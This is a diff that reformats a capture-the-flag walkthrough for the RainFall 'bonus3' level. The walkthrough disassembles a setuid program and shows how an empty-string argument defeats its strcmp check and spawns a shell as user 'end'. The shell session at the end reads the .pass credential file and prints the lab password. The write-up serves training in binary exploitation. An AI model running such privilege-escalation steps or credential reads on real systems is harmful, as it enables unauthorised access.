@@ -1,5 +1,5 @@
-This program reads the content of the .pass file and stores it in a buffer
-located on the stack, of size 132 :
+# This program reads the content of the .pass file and stores it in a buffer
+# located on the stack, of size 132 :
 
 	0x08048502 <+14>:	mov    $0x80486f0,%edx
 	0x08048507 <+19>:	mov    $0x80486f2,%eax
@@ -12,9 +12,9 @@ located on the stack, of size 132 :
 
    	0x0804851f <+43>:	lea    0x18(%esp),%ebx <== %ebx = buf;
 
-0x9c - 0x18 = 0x84 = 132
+	0x9c - 0x18 = 0x84 = 132
 
-This buffer is zero'd out by a call to memset :
+# This buffer is zero'd out by a call to memset :
 
 	0x0804851f <+43>:	lea    0x18(%esp),%ebx
 	0x08048523 <+47>:	mov    $0x0,%eax
@@ -25,7 +25,7 @@ This buffer is zero'd out by a call to memset :
 
 		memset(buf, 0, sizeof(buf));
 
-A check ensures that the file was successfully opened :
+# A check ensures that the file was successfully opened :
 
 	0x08048533 <+63>:	cmpl   $0x0,0x9c(%esp) if (file == NULL)
 	0x0804853b <+71>:	je     0x8048543 <main+79>
@@ -41,17 +41,17 @@ A check ensures that the file was successfully opened :
 
 		return (-1);
 
-And that 2 arguments were passed to the program :
+# And that 2 arguments were passed to the program :
 
 	0x0804853d <+73>:	cmpl   $0x2,0x8(%ebp) if (ac == 2)
 	0x08048541 <+77>:	je     0x804854d <main+89>
 
-It is not possible to leak the flag by using gdb because the process launched 
-by gdb is owned by user bonus3 and the target file by user end.
-Thus the call to fopen will fail and it won't be possible to read the content
-of the .pass file by inspecting the stack.
+# It is not possible to leak the flag by using gdb because the process launched 
+# by gdb is owned by user bonus3 and the target file by user end.
+# Thus the call to fopen will fail and it won't be possible to read the content
+# of the .pass file by inspecting the stack.
 
-By further inspecting the code, we can see that there's an issue :
+# By further inspecting the code, we can see that there's an issue :
 
 	0x08048579 <+133>:	mov    0xc(%ebp),%eax
 	0x0804857c <+136>:	add    $0x4,%eax
@@ -62,9 +62,10 @@ By further inspecting the code, we can see that there's an issue :
 
 		buf[atoi(av[1])] = '\0';
 
-This set of instructions means that it is possible to override any character
-in buf by zero.
-Further down the program verifies if the contents of buf and av[1] are similar :
+# This set of instructions means that it is possible to override any character
+# in buf by zero.
+# Further down the program verifies if the contents of buf and av[1] are
+# identical :
 
 	0x080485c7 <+211>:	mov    0xc(%ebp),%eax
 	0x080485ca <+214>:	add    $0x4,%eax
@@ -78,7 +79,7 @@ Further down the program verifies if the contents of buf and av[1] are similar :
 
 		if (strcmp(buf, av[1]) == 0)
 
-Before invoking a new shell :
+# Before invoking a new shell :
 
 	0x080485e3 <+239>:	movl   $0x0,0x8(%esp)
 	0x080485eb <+247>:	movl   $0x8048707,0x4(%esp)
@@ -87,21 +88,25 @@ Before invoking a new shell :
 
 		execl("/bin/sh", "sh", (char *)0);
 
-Buf is supposed to hold the flag but we have no way of guessing the value,
-so the only way to make sure strcmp returns 0 is by making sure it compares
-empty strings.
-As you may know, strcmp stops once it reaches a null character.
-We can override the first character of buf directly,
-but passing "0" as an argument to the program would translate to :
+# Buf is supposed to hold the flag but we have no way of guessing the value,
+# so the only way to make sure strcmp returns 0 is by making sure it compares
+# empty strings.
+# As you may know, strcmp stops once it reaches a null character.
+# We can override the first character of buf directly, but passing "0" as an
+# argument to the program would translate to :
 
 	./bonus3 0
 	...
 	strcmp("", "0");
 
-
-Finally, the answer is :
+# Finally, the answer is :
 
 bonus3@RainFall:~$ ./bonus3 ""
 $ whoami
 end
-$
+$ cat /home/user/$(whoami)/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+$ su end
+Password:
+end@RainFall:~$ cat end
+Congratulations graduate!
